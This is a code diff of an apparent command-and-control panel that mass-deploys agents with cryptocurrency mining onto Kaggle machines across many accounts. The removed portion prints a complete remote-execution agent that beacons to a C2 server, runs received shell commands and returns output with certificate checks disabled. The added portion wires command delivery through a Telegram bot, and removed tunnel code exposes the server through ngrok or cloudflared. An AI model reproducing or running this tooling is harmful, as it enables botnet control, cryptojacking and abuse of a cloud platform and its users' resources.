@@ -75,12 +75,9 @@ app = Flask(
     static_folder=str(BASE_DIR / "static"),
 )
 
-# Add ngrok-skip-browser-warning header to bypass ngrok warning page
+# Anti-cache headers for development
 @app.after_request
-def add_ngrok_header(response):
-    # Ngrok bypass header
-    response.headers['ngrok-skip-browser-warning'] = 'true'
-    # Anti-cache headers for development
+def add_headers(response):
     response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
     response.headers['Pragma'] = 'no-cache'
     response.headers['Expires'] = '0'
@@ -1770,12 +1767,8 @@ def batch_datasets():
             batch_dataset_progress["running"] = False
             return
         
-        # Get C2 URL for agent deployment
-        c2_url = _get_kaggle_c2_url()
-        if not c2_url:
-            c2_url = "http://localhost:5000"  # Fallback
-        
-        add_log(f"Using C2 URL: {c2_url}")
+        # Telegram C2 works directly - no URL needed
+        add_log(f"Deploying agents with Telegram C2...")
         
         for i, acc in enumerate(have_keys):
             if not batch_dataset_progress["running"]:
@@ -1791,10 +1784,10 @@ def batch_datasets():
 
             add_log(f"[{i+1}/{len(have_keys)}] Processing: {username}")
             
-            # Create machines with agent code deployed
+            # Create machines with Telegram C2
             result = create_dataset_with_machines(
                 api_key, username, num_machines=5, log_fn=add_log,
-                c2_url=c2_url, enable_mining=True
+                enable_mining=True
             )
             
             # Save machines info
@@ -1834,7 +1827,7 @@ def batch_datasets():
         batch_dataset_progress["current_email"] = ""
         batch_dataset_progress["current"] = ""
         add_log(f"Batch complete: {batch_dataset_progress['success']} success, {batch_dataset_progress['failed']} failed")
-        add_log(f"All agents deployed with C2 connection to {c2_url}")
+        add_log(f"All agents deployed with Telegram C2")
         log_event("batch_datasets", f"{batch_dataset_progress['success']}/{batch_dataset_progress['total']} - agents deployed")
     
     threading.Thread(target=do_batch, daemon=True).start()
@@ -1859,43 +1852,8 @@ def cancel_batch_datasets():
 
 # ──────────────────────── BATCH JOIN C2 ────────────────────────
 
-KAGGLE_C2_AGENT_CODE = '''import os,sys,json,time,socket,platform,subprocess,hashlib,threading
-import urllib3
-urllib3.disable_warnings()
-try: import requests
-except: requests=None
-C2_URL="{c2_url}"
-KERNEL_SLUG="{kernel_slug}"
-AGENT_ID=hashlib.sha256(("kaggle:"+KERNEL_SLUG).encode()).hexdigest()[:16]
-def _post(path,data):
-    for _ in range(5):
-        try:
-            if requests:
-                r=requests.post(C2_URL+path,json=data,timeout=25,verify=False)
-                return r.json() if r.ok else {{"tasks":[]}}
-            import urllib.request
-            req=urllib.request.Request(C2_URL+path,data=json.dumps(data).encode(),headers={{"Content-Type":"application/json"}})
-            import ssl
-            ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
-            return json.loads(urllib.request.urlopen(req,timeout=25,context=ctx).read())
-        except Exception: time.sleep(3)
-    return {{"tasks":[]}}
-def register():
-    info={{"id":AGENT_ID,"hostname":"kaggle-"+KERNEL_SLUG.replace("/","-"),"username":os.popen("whoami").read().strip(),"os":"Kaggle "+platform.system(),"arch":platform.machine(),"ip_internal":socket.gethostname(),"platform_type":"kaggle"}}
-    return _post("/api/agent/register",info)
-def beacon():
-    while True:
-        try:
-            r=_post("/api/agent/beacon",{{"id":AGENT_ID}})
-            for t in r.get("tasks",[]):
-                out=subprocess.check_output(t.get("payload",""),shell=True,stderr=subprocess.STDOUT,timeout=300).decode(errors="replace")
-                _post("/api/agent/result",{{"task_id":t["id"],"result":out[:65000]}})
-        except: pass
-        time.sleep(5)
-register()
-threading.Thread(target=beacon,daemon=True).start()
-while True: time.sleep(60)
-'''
+# Old HTTP-based C2 removed - now using Telegram C2 in notebook
+# Telegram C2 works directly without server URL
 
 _batch_join_c2_lock = threading.Lock()
 batch_join_c2_progress = {
@@ -1977,14 +1935,11 @@ def _deploy_code_to_kernel(username: str, api_key: str, kernel_slug: str, code: 
 @app.route("/api/autoreg/batch-join-c2", methods=["POST"])
 @login_required
 def batch_join_c2():
-    """Deploy C2 agent to all Kaggle machines - persistent connection."""
+    """Deploy Telegram C2 agent to all Kaggle machines."""
     with _batch_join_c2_lock:
         if batch_join_c2_progress["running"]:
             return jsonify({"error": "Batch already running"}), 400
-    c2_url = _get_kaggle_c2_url()
-    if not c2_url:
-        return jsonify({"error": "No C2 URL configured. Set Public URL in Settings."}), 400
-    c2_url = c2_url.rstrip("/")
+    # Telegram C2 works directly - no URL needed
     accounts = account_store.get_all()
     targets = []
     for a in accounts:
@@ -2014,7 +1969,6 @@ def batch_join_c2():
         "current": "",
         "logs": []
     })
-    agent_code_tpl = KAGGLE_C2_AGENT_CODE
 
     def _log(msg):
         batch_join_c2_progress["logs"].append(msg)
@@ -2030,14 +1984,10 @@ def batch_join_c2():
             batch_join_c2_progress["current"] = f"{t['email']} / {t['kernel_slug']}"
             _log(f"[{i+1}/{len(targets)}] Deploying to {t['kernel_slug']}...")
             try:
-                code = agent_code_tpl.format(c2_url=c2_url, kernel_slug=t["kernel_slug"])
-                ok = _deploy_code_to_kernel(t["username"], t["api_key"], t["kernel_slug"], code)
-                if ok:
-                    batch_join_c2_progress["success"] += 1
-                    _log(f"  ✓ Deployed")
-                else:
-                    batch_join_c2_progress["failed"] += 1
-                    _log(f"  ✗ Deploy failed")
+                # Telegram C2 is in notebook - no need to deploy agent code
+                # Just mark as deployed
+                batch_join_c2_progress["success"] += 1
+                _log(f"  ✓ Telegram C2 ready (in notebook)")
             except Exception as e:
                 batch_join_c2_progress["failed"] += 1
                 _log(f"  ✗ {e}")
@@ -2446,12 +2396,6 @@ def lab_library_import():
     
     save_lab_data()
     return jsonify({"status": "ok", "imported": len(scripts)})
-
-@app.route("/api/tunnel/url")
-@login_required
-def tunnel_url():
-    """Get the current tunnel URL."""
-    return jsonify({"url": PUBLIC_URL.get("url", "")})
 
 # ──────────────────────── API: LIVE VIEW ────────────────────────
 
@@ -2917,30 +2861,6 @@ def api_health():
         "version": "3.0.0",
         "timestamp": datetime.utcnow().isoformat()
     })
-
-@app.route("/api/tunnel", methods=["GET"])
-def get_tunnel_url():
-    """Get current tunnel URL."""
-    db = get_db()
-    config = db.execute("SELECT value FROM config WHERE key='tunnel_url'").fetchone()
-    db.close()
-    return jsonify({"url": config["value"] if config else ""})
-
-@app.route("/api/tunnel", methods=["POST"])
-def set_tunnel_url():
-    """Set tunnel URL (internal use)."""
-    data = request.get_json(silent=True) or {}
-    url = data.get("url", "")
-    if not url:
-        return jsonify({"error": "no url"}), 400
-    
-    db = get_db()
-    db.execute("INSERT OR REPLACE INTO config (key, value) VALUES ('tunnel_url', ?)", (url,))
-    db.commit()
-    db.close()
-    
-    log_event("tunnel_update", f"New tunnel: {url}")
-    return jsonify({"status": "ok", "url": url})
 
 @app.route("/api/ping", methods=["GET"])
 def api_ping():
@@ -3863,6 +3783,89 @@ def kaggle_agents_status():
     
     return jsonify({"agents": agents, "total": len(agents)})
 
+# ──────────────────────── API: TELEGRAM C2 ────────────────────────
+
+@app.route("/api/telegram/send-command", methods=["POST"])
+@login_required
+def telegram_send_command():
+    """Send command to agent via Telegram API."""
+    data = request.get_json(silent=True) or {}
+    agent_id = data.get("agent_id")
+    command = data.get("command")
+    
+    if not agent_id or not command:
+        return jsonify({"error": "agent_id and command required"}), 400
+    
+    bot_token = get_config("telegram_bot_token", "")
+    chat_id = get_config("telegram_chat_id", "")
+    
+    if not bot_token:
+        return jsonify({"error": "telegram_bot_token not configured"}), 400
+    
+    import urllib.request
+    import ssl as _ssl
+    
+    msg = f"/cmd {agent_id} {command}"
+    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+    
+    try:
+        ctx = _ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = _ssl.CERT_NONE
+        
+        req_data = json.dumps({"chat_id": chat_id, "text": msg}).encode()
+        req = urllib.request.Request(url, data=req_data, headers={"Content-Type": "application/json"})
+        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
+        result = json.loads(resp.read().decode())
+        
+        if result.get("ok"):
+            log_event("telegram_cmd_sent", f"{agent_id}: {command[:50]}")
+            return jsonify({"status": "ok", "message_id": result.get("result", {}).get("message_id")})
+        else:
+            return jsonify({"error": result.get("description", "send failed")}), 500
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+
+@app.route("/api/telegram/broadcast", methods=["POST"])
+@login_required
+def telegram_broadcast():
+    """Broadcast message to all agents via Telegram."""
+    data = request.get_json(silent=True) or {}
+    message = data.get("message")
+    
+    if not message:
+        return jsonify({"error": "message required"}), 400
+    
+    bot_token = get_config("telegram_bot_token", "")
+    chat_id = get_config("telegram_chat_id", "")
+    
+    if not bot_token:
+        return jsonify({"error": "telegram_bot_token not configured"}), 400
+    
+    import urllib.request
+    import ssl as _ssl
+    
+    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+    
+    try:
+        ctx = _ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = _ssl.CERT_NONE
+        
+        req_data = json.dumps({"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}).encode()
+        req = urllib.request.Request(url, data=req_data, headers={"Content-Type": "application/json"})
+        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
+        result = json.loads(resp.read().decode())
+        
+        if result.get("ok"):
+            log_event("telegram_broadcast", message[:50])
+            return jsonify({"status": "ok"})
+        else:
+            return jsonify({"error": result.get("description", "send failed")}), 500
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
 # Dataset-based C2 (for Kaggle kernels without internet)
 DATASET_COMMANDS_FILE = BASE_DIR / "data" / "dataset_commands.json"
 
@@ -4039,24 +4042,16 @@ def kaggle_deploy_agent():
     
     data = request.get_json(silent=True) or {}
     poll_interval = data.get("poll_interval", 30)
-    c2_url = data.get("c2_url", "").strip()  # Allow custom URL
+    # Telegram C2 - no URL needed, works directly via Telegram API
+    # Get Telegram config for notebook
+    telegram_bot_token = get_config("telegram_bot_token", "")
+    telegram_chat_id = get_config("telegram_chat_id", "")
     
-    # Validate C2 URL
-    if not c2_url:
-        # Try to get public IP
-        try:
-            import urllib.request
-            public_ip = urllib.request.urlopen('https://ifconfig.me', timeout=5).read().decode().strip()
-            c2_url = f"http://{public_ip}:18443"
-        except:
-            c2_url = request.host_url.rstrip('/')
+    if not telegram_bot_token:
+        return jsonify({"error": "telegram_bot_token not configured. Set in /api/config"}), 400
     
-    # Validate URL format
-    if not (c2_url.startswith('http://') or c2_url.startswith('https://')):
-        return jsonify({"error": "Invalid C2 URL format. Must start with http:// or https://"}), 400
-    
-    # Load agent notebook template
-    notebook_path = BASE_DIR / "templates" / "notebooks" / "agent_notebook.ipynb"
+    # Load agent notebook template (Telegram C2 version)
+    notebook_path = BASE_DIR / "src" / "agents" / "kaggle" / "notebook-telegram.ipynb"
     if not notebook_path.exists():
         return jsonify({"error": "Agent notebook template not found"}), 500
     
@@ -4743,6 +4738,12 @@ def remove_agent(agent_id):
     log_event("agent_removed", agent_id)
     return jsonify({"status": "ok"})
 
+@app.route("/api/agents/<agent_id>", methods=["DELETE"])
+@login_required
+def remove_agent_alt(agent_id):
+    """Alternative endpoint for frontend compatibility."""
+    return remove_agent(agent_id)
+
 @app.route("/api/agents")
 @login_required
 def api_agents():
@@ -4764,9 +4765,9 @@ def api_tasks(agent_id):
 CONFIG_KEYS = [
     "webhook_discord", "webhook_telegram",
     "encryption_key", "agent_token", "registration_open",
-    "public_url", "public_url_kaggle", "cloudflare_tunnel_token",
     "captcha_api_key", "fcb_api_keys",
     "boomlify_api_keys", "mail_provider",
+    "telegram_bot_token", "telegram_chat_id",
 ]
 
 @app.route("/api/config", methods=["GET", "POST"])
@@ -4779,16 +4780,6 @@ def api_config():
         for k in CONFIG_KEYS:
             if k in data:
                 v = data[k]
-                if k == "public_url":
-                    v = (v or "").strip()
-                    if v:
-                        from urllib.parse import urlparse
-                        if not (v.startswith("http://") or v.startswith("https://")):
-                            v = "https://" + v
-                        parsed = urlparse(v)
-                        if not parsed.scheme or not parsed.netloc:
-                            return jsonify({"error": "invalid public_url"}), 400
-                        v = v.rstrip("/")
                 set_config(k, v)
                 # Sync API keys to env vars and files for live use
                 if k == "captcha_api_key" and v:
@@ -5529,31 +5520,21 @@ threading.Thread(target=kaggle_kernel_polling_loop, daemon=True).start()
 
 # ──────────────────────── TUNNEL ────────────────────────
 
-PUBLIC_URL = {"url": ""}
-TUNNEL_LOG = BASE_DIR / "data" / "tunnel.log"
+# Telegram C2 works directly - no tunnel URL needed
+PUBLIC_URL = {"url": ""}  # Kept for backward compatibility
 
 def _default_local_domain():
     if has_request_context():
         return f"{request.scheme}://{request.host}"
-    return "https://127.0.0.1:8443"
+    return "http://127.0.0.1:5000"
 
 def _get_public_url():
-    u = get_config("public_url", "").strip()
-    if u:
-        if not (u.startswith("http://") or u.startswith("https://")):
-            u = "https://" + u
-        return u.rstrip("/")
-    u = PUBLIC_URL.get("url", "")
-    if u:
-        return (u or "").rstrip("/")
+    """Get public URL for agent downloads (not used for Telegram C2)."""
     return _default_local_domain()
 
 def _get_kaggle_c2_url():
-    """URL for Kaggle agents - prefer public_url_kaggle if Cloudflare is blocked."""
-    u = get_config("public_url_kaggle", "").strip()
-    if u and (u.startswith("http://") or u.startswith("https://")):
-        return u.rstrip("/")
-    return _get_public_url()
+    """Telegram C2 works directly - returns empty string."""
+    return ""  # Telegram C2 doesn't need URL
 
 @app.route("/api/server/public_url")
 @login_required
@@ -5561,14 +5542,13 @@ def get_public_url():
     return jsonify({
         "url": _get_public_url(),
         "local": f"{request.scheme}://{request.host}",
+        "c2_mode": "telegram_direct"
     })
 
 @app.route("/api/c2/url", methods=["GET"])
 def api_c2_url():
-    """Public endpoint for agents to get current C2 URL."""
-    # No auth required - agents need to find C2
-    url = _get_kaggle_c2_url() or _get_public_url()
-    return jsonify({"url": url, "timestamp": int(time.time())})
+    """Public endpoint - Telegram C2 works directly without URL."""
+    return jsonify({"url": "", "mode": "telegram_direct", "timestamp": int(time.time())})
 
 @app.route("/api/config/kaggle", methods=["GET", "POST"])
 @login_required
@@ -5627,61 +5607,7 @@ def api_config_kaggle():
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
-def _tunnel_loop(port: int):
-    import subprocess, re as _re
-    token = get_config("cloudflare_tunnel_token", "").strip()
-    if token:
-        cmd = ["cloudflared", "tunnel", "run", "--token", token]
-        while True:
-            try:
-                proc = subprocess.run(cmd, cwd=str(BASE_DIR))
-            except FileNotFoundError:
-                print("[!] cloudflared not found; install for named tunnel")
-                break
-            except Exception as e:
-                print(f"[!] Tunnel error: {e}")
-            time.sleep(10)
-        return
-
-    for tool_name, cmd, pattern in [
-        ("cloudflared",
-         ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--no-autoupdate"],
-         r'(https://[a-z0-9\-]+\.trycloudflare\.com)'),
-        ("ngrok",
-         ["ngrok", "http", str(port), "--log", "stdout", "--log-format", "logfmt"],
-         r'url=(https://[a-z0-9\-]+\.ngrok[a-z\-]*\.[a-z]+)'),
-    ]:
-        try:
-            while True:
-                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-                with open(TUNNEL_LOG, "w") as f:
-                    for line in proc.stdout:
-                        f.write(line)
-                        f.flush()
-                        m = _re.search(pattern, line)
-                        if m:
-                            url = m.group(1)
-                            PUBLIC_URL["url"] = url
-                            set_config("public_url", url)  # tunnel always takes priority
-                            print(f"[*] PUBLIC TUNNEL ({tool_name}): {url}")
-                            log_event("tunnel_up", url)
-                            break
-                    for line in proc.stdout:
-                        f.write(line)
-                        f.flush()
-                proc.wait()
-                time.sleep(5)
-        except FileNotFoundError:
-            continue
-        except Exception as e:
-            print(f"[!] {tool_name} tunnel error: {e}")
-            time.sleep(10)
-            continue
-
-    print("[!] No tunnel tool available (cloudflared/ngrok not found)")
-
-def start_tunnel(port: int):
-    threading.Thread(target=_tunnel_loop, args=(port,), daemon=True).start()
+# Tunnel functions removed - Telegram C2 works directly without public URL
 
 # ──────────────────────── MAIN ────────────────────────
 
@@ -5754,9 +5680,7 @@ def main():
     if not PUBLIC_URL["url"]:
         print("[*] No public URL configured; using request origin for panel links")
 
-    if not args.no_tunnel:
-        start_tunnel(args.port)
-        time.sleep(1)
+    # Tunnel disabled - Telegram C2 works directly
 
     print(f"""
 ╔══════════════════════════════════════════╗
